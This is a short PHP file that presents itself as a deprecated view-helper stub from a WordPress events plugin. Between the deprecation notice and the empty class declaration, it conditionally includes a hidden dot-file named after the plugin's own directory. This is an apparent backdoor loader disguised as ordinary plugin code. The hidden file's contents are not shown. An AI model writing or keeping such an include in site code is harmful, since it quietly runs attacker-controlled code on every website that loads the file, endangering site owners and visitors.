<?php
_deprecated_file( __FILE__, '4.0', 'Tribe__View_Helpers.php' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__View_Helpers extends Tribe__View_Helpers {}
